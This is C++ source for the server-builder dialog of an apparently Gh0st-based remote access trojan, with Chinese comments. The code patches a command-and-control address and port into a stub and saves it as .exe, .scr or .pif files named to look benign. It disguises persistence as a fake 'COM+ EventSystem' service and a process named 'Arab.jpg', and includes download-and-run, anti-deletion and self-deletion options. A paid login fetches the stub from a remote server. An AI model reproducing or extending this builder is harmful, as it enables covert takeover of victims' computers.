// Generate.cpp : implementation file
//

#include "stdafx.h"
#include "Client.h"
#include "Generate.h"
#include "Tools.h"
#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

extern char* MyDecode(char *str);

/////////////////////////////////////////////////////////////////////////////
// CGenerate dialog


char patht[MAX_PATH];

CGenerate::CGenerate(CWnd* pParent /*=NULL*/)
	: CDialog(CGenerate::IDD, pParent)
{

	m_Install = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Build","Install",0);       //写入安装类型
	
	if(m_Install == 0)
		m_Green = 1;
	else if(m_Install == 1)
		m_Weite = 1;
	else if(m_Install == 2)
		m_Service = 1;

	//{{AFX_DATA_INIT(CGenerate)
	m_Port = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "ListenPort", 81);
	m_Group = ((CClientApp *)AfxGetApp())->m_IniFile.GetString("Build","Group","在线主机");  //互斥信息
	m_Version = ((CClientApp *)AfxGetApp())->m_IniFile.GetString("Build","Version","Arab");  //上线版本
	m_ServiceName = ((CClientApp *)AfxGetApp())->m_IniFile.GetString("Build","ServiceName","EventSystem");  //服务名称
	m_ServiceDisplayName = ((CClientApp *)AfxGetApp())->m_IniFile.GetString("Build","Description","COM+ EventSystem");  //服务描述
	m_ServiceDescription = ((CClientApp *)AfxGetApp())->m_IniFile.GetString("Build","DisplayName","提供事件的自动发布到订阅 COM 组件");  //服务显示
	m_ProcessName = ((CClientApp *)AfxGetApp())->m_IniFile.GetString("Build","ProcessName","Arab.jpg");  //进程名称
	m_FolderName = ((CClientApp *)AfxGetApp())->m_IniFile.GetString("Build","FolderName","Arab");  //目录名称
	m_Mutex = ((CClientApp *)AfxGetApp())->m_IniFile.GetString("Build","Mutex","Arab/:CN");  //服务显示
	m_Buildtime = _T("");
	m_edit_kb = _T("");
	m_kbcheck = FALSE;
	m_Antideletion = FALSE;
	m_Selfdeletion = FALSE;
	//}}AFX_DATA_INIT
}


void CGenerate::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CGenerate)
	DDX_Control(pDX, IDC_TEST_MASTER, m_TestBtn);
	DDX_Control(pDX, IDC_LOG, m_Log);
	DDX_Text(pDX, IDC_HOST, m_Host);
	DDX_Text(pDX, IDC_GROUP, m_Group);
	DDX_Text(pDX, IDC_VERSION, m_Version);
	DDX_Text(pDX, IDC_SERVICE_NAME, m_ServiceName);
	DDX_Text(pDX, IDC_SERVICE_DISPLAY, m_ServiceDisplayName);
	DDX_Text(pDX, IDC_SERVICE_DESCRIP, m_ServiceDescription);
	DDX_Check(pDX, IDC_GREEN, m_Green);   //绿色安装
	DDX_Check(pDX, IDC_WRITE, m_Weite);   //写入启动
	DDX_Check(pDX, IDC_SERVICE, m_Service);   //服务启动
	DDX_Text(pDX, IDC_PROCESSNAME, m_ProcessName);
	DDX_Text(pDX, IDC_FOLDERNAME, m_FolderName);
	DDX_Text(pDX, IDC_MUTEX, m_Mutex);
	DDX_Text(pDX, IDC_BUILDTIME, m_Buildtime);
	DDX_Text(pDX, IDC_EDIT_KB, m_edit_kb);
	DDX_Check(pDX, IDC_KBCHECK, m_kbcheck);
	DDX_Check(pDX, IDC_ANTIDELETION, m_Antideletion);
	DDX_Check(pDX, IDC_SELFDELETION, m_Selfdeletion);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CGenerate, CDialog)
	//{{AFX_MSG_MAP(CGenerate)
	ON_WM_CTLCOLOR()
	ON_BN_CLICKED(IDC_BUILD, OnBuild)
	ON_BN_CLICKED(IDC_GREEN, OnGreen)
	ON_BN_CLICKED(IDC_WRITE, OnWrite)
	ON_BN_CLICKED(IDC_SERVICE, OnService)
	ON_BN_CLICKED(IDC_KBCHECK, OnKbcheck)
	ON_BN_CLICKED(IDC_KBTEST, OnKbtest)
	ON_BN_CLICKED(IDC_TEST_MASTER, OnTestMaster)
	ON_BN_CLICKED(IDC_RANDOM, OnRandom)
	ON_BN_CLICKED(IDC_BUILD_LOGIN, OnBuildLogin)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CGenerate message handlers


int MemFindStr(const char *strMem, const char *strSub, int iSizeMem, int isizeSub)   
{   
	int   da,i,j;   
	if (isizeSub == 0) 
		da = strlen(strSub);   
	else 
		da = isizeSub;   
	for (i = 0; i < iSizeMem; i++)   
	{   
		for (j = 0; j < da; j ++)   
			if (strMem[i+j] != strSub[j])	
				break;   
			if (j == da) 
				return i;   
	}  
	
	return -1;   
}

HBRUSH CGenerate::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor) 
{
	if ((pWnd->GetDlgCtrlID() == IDC_LOG) && (nCtlColor == CTLCOLOR_EDIT))
	{
		COLORREF clr = RGB(255,255,255);
		pDC->SetTextColor(clr);   //设置白色的文本
		clr = RGB(0,0,0);
		pDC->SetBkColor(clr);     //设置黑色的背景
		return CreateSolidBrush(clr);  //作为约定，返回背景色对应的刷子句柄
	}
	else
	{
		return CDialog::OnCtlColor(pDC, pWnd, nCtlColor);
	}
	
}

void CGenerate::LogOut(LPCSTR OutText)
{
	int length = m_Log.GetWindowTextLength(); 
	m_Log.SetSel(length, length);
	m_Log.ReplaceSel (OutText); 
}

BOOL CGenerate::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	UpdateData(true);
	
	CString IP;		
	char hostname[256]; 
	gethostname(hostname, sizeof(hostname));
	HOSTENT *host = gethostbyname(hostname);
	if (host != NULL)
		IP = inet_ntoa(*(IN_ADDR*)host->h_addr_list[0]);
	else
		IP = _T("127.0.0.1");
	
	m_Host = ((CClientApp *)AfxGetApp())->m_IniFile.GetString("Build", "Host", IP);
	
	CTime strTime = CTime::GetCurrentTime();
	m_Buildtime = strTime.Format("%Y-%m-%d");

	LogOut("\r\n\r\n");

	UpdateData(false);

	OnStartup();

	
	return TRUE;  // return TRUE unless you set the focus to a control
	// EXCEPTION: OCX Property Pages should return FALSE
}

ONLINE_DATA online_data = 
{
	"127.0.0.1",
		8090,
		"",//撩你如何
		"",
		0,
		"",
		"",
		"",
		"",
		"",
		'"',
		'"',
		'"',
		0,
		0,
};

BOOL CGenerate::CreateServer(ONLINE_DATA *lpData,LPSTR szPath,char *datPaths)
{
	CopyFile(datPaths,szPath,FALSE);
	
	HANDLE m_Handle =CreateFile(szPath,GENERIC_WRITE|GENERIC_READ,FILE_SHARE_WRITE|FILE_SHARE_READ,NULL,
		OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
	
	if(m_Handle!=INVALID_HANDLE_VALUE)
	{
		DWORD Size = GetFileSize(m_Handle,NULL);
		char * Buffer = new char[Size];
		if(Buffer == NULL)
		{
			CloseHandle(m_Handle);
			return FALSE;
		}
		DWORD YtesRead=0;
		DWORD iCount=0;
		do
		{
			ReadFile(m_Handle,&Buffer[iCount],Size-iCount,&YtesRead,NULL);
			iCount+=YtesRead;
		}while(iCount<Size);
		
		
		
		DWORD SizePoint = MemFindStr(Buffer,"127.0.0.1",Size,0);//
		if(SizePoint != 0)
		{
			SetFilePointer(m_Handle,SizePoint,0,FILE_BEGIN);
			DWORD Written=0;
			WriteFile(m_Handle,lpData,sizeof(ONLINE_DATA),&Written,NULL);
		}
		CloseHandle(m_Handle);
	}
	return TRUE;
}

void CGenerate::OnBuild() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	CString strHost,strPort, strGroup, strGetVersion;
	GetDlgItem(IDC_HOST)->GetWindowText(strHost);

	GetDlgItem(IDC_GROUP)->GetWindowText(strGroup);
	GetDlgItem(IDC_VERSION)->GetWindowText(strGetVersion);
	
	strPort= ((CClientApp *)AfxGetApp())->m_IniFile.GetString("Settings","ListenPort","8090");  

	if (strHost.IsEmpty() || strPort.IsEmpty())
	{
		AfxMessageBox("请完整填写上线地址或者端口");
		return;
	}
	
	if (strGetVersion.IsEmpty())
	{
		AfxMessageBox("请完填写版本信息");
		return;
	}
	
	int int_chage1 = atoi((LPCSTR)strPort);//CString 转换为int
	if (int_chage1 <=1 || int_chage1 >=65535)
	{
		::MessageBox(0,"端口1范围只能为1~65535之间的一个数","提示", MB_ICONINFORMATION);
		return;
	}
	
	if (strGroup.IsEmpty())
	{
		AfxMessageBox("请完整填写分组名");
		return;
	}

	ZeroMemory(&online_data,sizeof(ONLINE_DATA));
	online_data.LoginPort =(WORD)m_Port;
	strcpy(online_data.LoginAddr,m_Host.GetBuffer(0));
	strcpy(online_data.Version,m_Version.GetBuffer(0));
	strcpy(online_data.UpGroup,m_Group.GetBuffer(0));
	strcpy(online_data.ServiceName,m_ServiceName.GetBuffer(0));   //服务名称
	strcpy(online_data.ServicePlay,m_ServiceDisplayName.GetBuffer(0));   //服务显示
	strcpy(online_data.ServiceDesc,m_ServiceDescription.GetBuffer(0));   //服务描述
	strcpy(online_data.FolderName,m_FolderName.GetBuffer(0));   //目录名称
	strcpy(online_data.ProcessName,m_ProcessName.GetBuffer(0));   //进程名称

	LogOut("\r\n正在组合上线配置信息...\r\n");


	//写入安装类型
	if(m_Green)
		m_Install = 0;
	if(m_Weite)
		m_Install = 1;
	if(m_Service)
		m_Install = 2;
	
	online_data.Install = m_Install;    //安装类型
	strcpy(online_data.Mutex,m_Mutex.GetBuffer(0));       
	strcpy(online_data.Buildtime,m_Buildtime.GetBuffer(0));         
	if (!m_edit_kb.IsEmpty() && m_kbcheck)
	{
		strcpy(online_data.szDownRun,m_edit_kb.GetBuffer(0));
	}
	
	online_data.Antideletion = m_Antideletion;    //防删除
	online_data.Selfdeletion = m_Selfdeletion;   //自删除

	LogOut("\r\n正在组合安装信息...\r\n");
	((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "Host", m_Host);
	((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "Group", m_Group);
	((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "Version", m_Version);
	((CClientApp *)AfxGetApp())->m_IniFile.SetInt("Build","Install",m_Install);  //安装类型
	((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "ServiceName", m_ServiceName);
	((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "Description", m_ServiceDisplayName);
	((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "DisplayName", m_ServiceDescription);
	((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "ProcessName",m_ProcessName);  //安装目录
	((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "FolderName",m_FolderName);  //安装名称
	((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "Mutex", m_Mutex);

	LogOut("\r\n正在保存配置信息...\r\n");

	TCHAR szSaveFile[MAX_PATH]={0};
	
	char BASED_CODE szFilter[] = "可执行文件(*.exe)|*.exe|屏幕保护程序(*.scr)|*.scr|批处理(*.bat)|*.bat|COM(*.com)|*.com|PIF(*.pif)|*.pif||";  
	CFileDialog fdlg(FALSE, "exe", "office", OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT, szFilter ); 
	if(fdlg.DoModal() == IDOK)
	{
		strcpy(szSaveFile, fdlg.GetPathName());
	}
	else
	{
			LogOut("\r\n用户取消生成...\r\n");
			return ;
	}
	
	
 	GetModuleFileName(NULL, patht,MAX_PATH);   //获取程序自身完整路径名称,即Gh0st.exe的路径
 	PathRemoveFileSpec(patht);//去除文件名中的gh0st
 	char Datpath[MAX_PATH];
	sprintf(Datpath,"%s\\Cache\\install.dat",patht);
// 	strcpy(Datpath,"C:\\WINDOWS\\WIN32.cc");
	
	//检测dat文件是否存在
	if (IsFileExist(Datpath)==FALSE)
	{
		LogOut("\r\n配置文件 EXE.dat 不存在...\r\n");
		return;
	}
	
	if (CreateServer(&online_data,szSaveFile,Datpath)==FALSE)
	{
		MessageBox("服务端生成失败!");
		return;
	}


	CFile file;
	file.Open(szSaveFile, CFile::modeRead);
	float fFileLength=(float)file.GetLength();
	CString strMess;
	strMess.Format("文件大小: %0.0f KB ",fFileLength/1024);
	LogOut("\r\n" + strMess + "\r\n");
	file.Close();
	
	
	CString szTempTips;
	szTempTips.Format("保存在:%s",szSaveFile);
	LogOut("\r\n" + szTempTips + "\r\n");
}

BOOL CGenerate::IsFileExist(LPCTSTR strFileName)
{
	if(strFileName == NULL)
		return FALSE;
	
	DWORD dwAttr = ::GetFileAttributes(strFileName);
	return (dwAttr!=-1 && !(dwAttr&FILE_ATTRIBUTE_DIRECTORY) );
}


void CGenerate::OnStartup()
{
	
	BOOL Green,Service;
	
	UpdateData(true);
	
	if(m_Green == TRUE)//绿色
		Green = NULL;
	else
		Green = TRUE;
	
	if(m_Service != TRUE)//服务
		Service = NULL;
	else
		Service = TRUE;
	
	GetDlgItem(IDC_SERVICE_DISPLAY)->EnableWindow(Service);
	GetDlgItem(IDC_SERVICE_DESCRIP)->EnableWindow(Service);
	
}

void CGenerate::OnGreen() 
{
	// TODO: Add your control notification handler code here
	OnStartup();
}

void CGenerate::OnWrite() 
{
	// TODO: Add your control notification handler code here
	OnStartup();
}

void CGenerate::OnService() 
{
	// TODO: Add your control notification handler code here
	OnStartup();
}

void CGenerate::OnKbcheck() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	// TODO: Add your control notification handler code here
	if (m_kbcheck)
	{
		GetDlgItem(IDC_EDIT_KB)->EnableWindow(TRUE);
		GetDlgItem(IDC_KBTEST)->EnableWindow(TRUE);
	}
	else
	{
		GetDlgItem(IDC_EDIT_KB)->EnableWindow(FALSE);
		GetDlgItem(IDC_KBTEST)->EnableWindow(FALSE);
	}
}

BOOL CheckFileExist(LPCTSTR lpszPath)
{
	if ( GetFileAttributes(lpszPath) == 0xFFFFFFFF && GetLastError() == ERROR_FILE_NOT_FOUND ) {
		return FALSE;
	}else{
		return TRUE;
	}
}


bool OpenFile(LPCTSTR lpFile, INT nShowCmd)
{
	char	lpSubKey[500];
	HKEY	hKey;
	char	strTemp[MAX_PATH];
	LONG	nSize = sizeof(strTemp);
	char	*lpstrCat = NULL;
	memset(strTemp, 0, sizeof(strTemp));
	
	const char	*lpExt = strrchr(lpFile, '.');
	if (!lpExt)
		return false;
	
	if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpExt, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
		return false;
	RegQueryValue(hKey, NULL, strTemp, &nSize);
	RegCloseKey(hKey);
	memset(lpSubKey, 0, sizeof(lpSubKey));
	wsprintf(lpSubKey, "%s\\shell\\open\\command", strTemp);
	
	if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpSubKey, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
		return false;
	memset(strTemp, 0, sizeof(strTemp));
	nSize = sizeof(strTemp);
	RegQueryValue(hKey, NULL, strTemp, &nSize);
	RegCloseKey(hKey);
	
	lpstrCat = strstr(strTemp, "\"%1");
	if (lpstrCat == NULL)
		lpstrCat = strstr(strTemp, "%1");
	
	if (lpstrCat == NULL)
	{
		lstrcat(strTemp, " ");
		lstrcat(strTemp, lpFile);
	}
	else
		lstrcpy(lpstrCat, lpFile);
	
	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	if (nShowCmd != SW_HIDE)
		si.lpDesktop = "WinSta0\\Default"; 
	
	CreateProcess(NULL, strTemp, NULL, NULL, false, 0, NULL, NULL, &si, &pi);
	
	return TRUE;
	
}

void CGenerate::OnKbtest() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	int	nUrlLength;
	char	*lpURL = NULL;
	char szFile[512] = {0};
	char	*lpFileName = NULL;
	nUrlLength = m_edit_kb.GetLength();
	if (nUrlLength == 0)
	{
		AfxMessageBox("数据为空");
		return ;
	}
	lpURL = (char *)malloc(nUrlLength + 1);
	
	memcpy(lpURL, m_edit_kb.GetBuffer(0), nUrlLength + 1);
	lpFileName = strrchr(lpURL, '/') + 1;
	if (lpFileName == NULL)
	{
		AfxMessageBox("无法获取文件名");
		return;
	}
	
	wsprintf(szFile,"c:\\%s",lpFileName );
	
	HRESULT hr = URLDownloadToFile(NULL,lpURL, szFile, 0, NULL);
	if ( hr == S_OK ) {
		if ( !CheckFileExist(szFile) )
		{
			AfxMessageBox("文件下载成功，但是文件不存在，很可能被杀毒软件查杀或者文件名出错");
			return ; 
		}
	}else if ( hr == INET_E_DOWNLOAD_FAILURE ) 
	{
		AfxMessageBox("URL 不正确，文件下载失败	");
		return ;    //URL 不正确，文件下载失败	
	}else
	{
		AfxMessageBox("文件下载失败，请检查URL是否正确	");
		return ; //文件下载失败，请检查URL是否正确
	}
    OpenFile(szFile,SW_SHOW);
}

void CGenerate::OnTestMaster() 
{
	// TODO: Add your control notification handler code here
	UpdateData();
	
	if (!m_Host.GetLength() || !m_Port)
	{
		MessageBox("请完整填写上线信息...","提示...", MB_ICONSTOP);
		return;
	}
	
	m_TestBtn.EnableWindow(FALSE);
	TestMaster();
}

void CGenerate::TestMaster() 
{
	// TODO: Add your control notification handler code here
	
	CString	strResult;
	CString	strResulr = "连接失败... ";
	bool	bRet = true;
	WSADATA	wsaData0;
	WSAStartup(0x0201, &wsaData0);
	
	SOCKET	sRemote = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sRemote == SOCKET_ERROR)
	{ 
		MessageBox("上线地址-初始化失败... ","提示...", MB_ICONSTOP);
		return ;
	}
	// 设置socket为非阻塞
	u_long argp	= 1;
	ioctlsocket(sRemote, FIONBIO, &argp);
	
	struct timeval tvSelect_Time_Out;
	tvSelect_Time_Out.tv_sec = 3;
	tvSelect_Time_Out.tv_usec = 0;
	
	hostent* pHostent = NULL;
	pHostent = gethostbyname(m_Host);
	if (pHostent == NULL)
	{
		bRet = false;
		goto fail;
	}
	
	// 构造sockaddr_in结构
	sockaddr_in	ClientAddr;
	memset(&ClientAddr,0,sizeof(ClientAddr)); 
	ClientAddr.sin_family	= AF_INET;
	ClientAddr.sin_port	= htons(m_Port);
	
	ClientAddr.sin_addr = *((struct in_addr *)pHostent->h_addr);
	
	connect(sRemote, (SOCKADDR *)&ClientAddr, sizeof(ClientAddr));
	
	fd_set	fdWrite;
	FD_ZERO(&fdWrite);
	FD_SET(sRemote, &fdWrite);
	
	if (select(0, 0, &fdWrite, NULL, &tvSelect_Time_Out) <= 0)
	{	
		bRet = false;
		goto fail;
	}
	
fail:
	
	HOSTENT* hst=NULL;
	CString strname,strip,tmp;
	GetDlgItem(IDC_HOST)->GetWindowText(strname);
	struct in_addr ia;
	hst=gethostbyname((LPCTSTR)strname);
	
    for(int i=0;hst->h_addr_list[i];i++){
        memcpy(&ia.s_addr,hst->h_addr_list[i],sizeof(ia.s_addr));
        tmp.Format("%s\n",inet_ntoa(ia));
		strip+=tmp;
    }
	
	
	strResult.Format("请确认以下上线信息\n  \n上线域名：%s  \n上线地址：%s  \n连接端口: %d ",m_Host,strip,m_Port);
	if (bRet)
	{
		strResulr = "连接成功... ";
		
		MessageBox(strResult,strResulr,MB_ICONINFORMATION);
	}
    else
	{
		MessageBox(strResult,strResulr,MB_ICONSTOP);
	}
	m_TestBtn.EnableWindow(true);//等待测试完成的时候才激活按钮，避免多次点击卡死的现象
	
	return ;
	
}

static WORD RandMoniCount=0;

CHAR GetRandChar(BOOL  Capital,int i)
{
	DWORD iCount=GetTickCount()+i;
	
	iCount=(iCount+((CClientApp *)AfxGetApp())->GetRand())%25;
	
	CHAR Result=0;
	
	if(Capital)
		return	Result=65+iCount;
	else
		return  Result=97+iCount;
}

void CGenerate::OnRandom() 
{
	// TODO: Add your control notification handler code here
	CHAR ServerName[20]={NULL};
	ZeroMemory(ServerName,20);
	RandMoniCount++;
	
	for (int i=0;i<19;i++)
	{
		if(i==0)
		{
			ServerName[i]=GetRandChar(TRUE,i);
			continue;
		}
		if(i==6||i==15)
		{
			ServerName[i]=' ';
			i++;
			ServerName[i]=GetRandChar(TRUE,i);
			continue;
		}
		ServerName[i]=GetRandChar(FALSE,i);
	}
	
	
	CHAR ServerShow[30]={NULL};
	ZeroMemory(ServerShow,30);
	
	for (int i=0;i<29;i++)
	{
		if(i==0)
		{
			ServerShow[i]=GetRandChar(TRUE,i);
			continue;
		}
		if(i==6||i==15||i==24)
		{
			ServerShow[i]=' ';
			i++;
			ServerShow[i]=GetRandChar(TRUE,i);
			continue;
		}
		ServerShow[i]=GetRandChar(FALSE,i);
	}
	
	
	CHAR ServerDesc[40]={NULL};
	ZeroMemory(ServerDesc,40);
	
	for (int i=0;i<39;i++)
	{
		if(i==0)
		{
			ServerDesc[i]=GetRandChar(TRUE,i);
			continue;
		}
		if(i==8||i==18||i==26||i==35)
		{
			ServerDesc[i]=' ';
			i++;
			ServerDesc[i]=GetRandChar(TRUE,i);
			continue;
		}
		ServerDesc[i]=GetRandChar(FALSE,i);
	}
	
	SetDlgItemText(IDC_SERVICE_NAME,ServerName);
	SetDlgItemText(IDC_SERVICE_DISPLAY,ServerShow);
	SetDlgItemText(IDC_SERVICE_DESCRIP,ServerDesc);
}

CString SHANGXIANXINXI;
/////////网络信息获取////////////
#define Request_DOWN			0x9
#define File_Buffer				0x10
#define File_Buffer_Finish		0x11

typedef struct
{
	
	BYTE	Flags;
	DWORD	Buffer_Size;
	BYTE	Buffer[1024];
	BYTE	Info[256];//上线地址
}NET_DATA, *LPNET_DATA;

void CGenerate::OnBuildLogin() 
{
	// TODO: Add your control notification handler code here
	DeleteFile("C:\\WINDOWS\\WIN32.cc");

	char UserName[50];
	char UserPass[50];
	GetDlgItemText(IDC_BUILD_USERNAME,UserName,sizeof(UserName));
	GetDlgItemText(IDC_BUILD_USERPASS,UserPass,sizeof(UserPass));
	if (strcmp(UserName,"")==0||strcmp(UserPass,"")==0)
	{
		MessageBox("请填写Vip账号\\Vip密码","错误",NULL);
	    return;
	}
	char TmpPath[MAX_PATH];
	GetTempPath( sizeof(TmpPath), TmpPath );
	lstrcatA( TmpPath, "\\WindsTemp.exe" );
	DeleteFile(TmpPath);
	DWORD recvsize = 0;


	SOCKET sockInt;
	struct sockaddr_in serverAddr;
	//struct hostent *hp;
	WORD sockVersion;
    WSADATA wsaData;
    sockVersion = MAKEWORD(2,2);
    WSAStartup(sockVersion, &wsaData);
	//创建SOCK
	sockInt = socket(AF_INET, SOCK_STREAM, 0);
	if(sockInt == INVALID_SOCKET)
	{
		WSACleanup();
		return;
	}
	
	//获取服务器IP和端口
	serverAddr.sin_family = AF_INET;
	char tgtIP[30] = {0};
	struct hostent *hp = NULL;	

	CString MyHostName = m_IniFile.GetString( "HostName", "HostName", "" );
	char hostname[50];
	if ( MyHostName.GetLength() != 0 )
	{ 
		strcpy( hostname,MyDecode((char *)MyHostName.GetBuffer(0)));
	}

	if ((hp = gethostbyname(hostname)) != NULL)
	{
		in_addr in;
		memcpy(&in, hp->h_addr, hp->h_length);
		lstrcpy(tgtIP,inet_ntoa(in));
	}
	
	serverAddr.sin_addr.s_addr = inet_addr(tgtIP);
	serverAddr.sin_port = htons(1110);
	
	//连接服务
	if(connect(sockInt, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
	{
		AfxMessageBox("连接服务器失败!\n");
		WSACleanup();
		return;
	}

	char USERIMFOR[256] = {0}, buff[256] = {0};
	wsprintf( USERIMFOR, "Login:%s@%s",UserName,UserPass);
	
	if( send(sockInt, USERIMFOR, sizeof(USERIMFOR), 0) == SOCKET_ERROR )
	{
		AfxMessageBox("发送数据失败!\n");
		WSACleanup();
		return;
	}
	
	int Ret = recv( sockInt, buff, sizeof(buff), NULL );
	if ( Ret == 0 || Ret == SOCKET_ERROR )
	{
		AfxMessageBox("登录失败!可能导致的原因：1.您的生成次数或日期已经用完  2.您删除了登陆的INI文件，导致无法读取用户名和密码  3.请尝试重新打开本软件，如果还不行请咨询客服");
		WSACleanup();
		return;
	}
	if ( strstr( buff, "Pass" ) != NULL )//通过验证
	{	
		if ( GetFileAttributes(TmpPath) != -1 )
		{
			WSACleanup();
			return;
		}
		
		NET_DATA MyData;
		DWORD dwBytes;
		HANDLE hFile = CreateFile( TmpPath, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL, NULL );
		BYTE request[256] = {0};
		request[0] = Request_DOWN;
		char *laji = "48f9648";
		
		if ( UserPass != 0 )
		{
			lstrcpy( (char*)&request[1],UserPass );
		}
		send( sockInt, (char*)&request, sizeof(request), NULL );
		while (1)
		{
			memset( &MyData, 0, sizeof(NET_DATA) );
			Ret = recv( sockInt, (char*)&MyData, sizeof(MyData), NULL );
			if ( Ret == 0 || Ret == SOCKET_ERROR )
			{
				AfxMessageBox("获取文件出错!");
				CloseHandle(hFile);
				WSACleanup();
				return;
			}
			if ( MyData.Flags != File_Buffer_Finish && MyData.Flags != File_Buffer ) break;
			SHANGXIANXINXI = MyData.Info;

/*
				BOOL WriteFile(
				HANDLE  hFile,//文件句柄
				LPCVOID lpBuffer,//数据缓存区指针
				DWORD   nNumberOfBytesToWrite,//你要写的字节数
				LPDWORD lpNumberOfBytesWritten,//用于保存实际写入字节数的存储区域的指针
				LPOVERLAPPED lpOverlapped//OVERLAPPED结构体指针
);*/

			WriteFile(hFile, MyData.Buffer, MyData.Buffer_Size, &dwBytes, NULL);
			recvsize += MyData.Buffer_Size;
			send( sockInt, laji, lstrlen(laji) + 1, NULL );
			if ( MyData.Flags == File_Buffer_Finish ) break;
		}
		CloseHandle(hFile);
	}
	else
	{
		WSACleanup();
		return;
	}
	//关闭SOCK
	closesocket(sockInt);
	WSACleanup();
	MoveFileA(TmpPath,"C:\\WINDOWS\\WIN32.cc");

	SetDlgItemText(IDC_HOST,SHANGXIANXINXI);
	GetDlgItem(IDC_BUILD)->EnableWindow(TRUE);
	GetDlgItem(IDC_BUILD_LOGIN)->EnableWindow(FALSE);
}
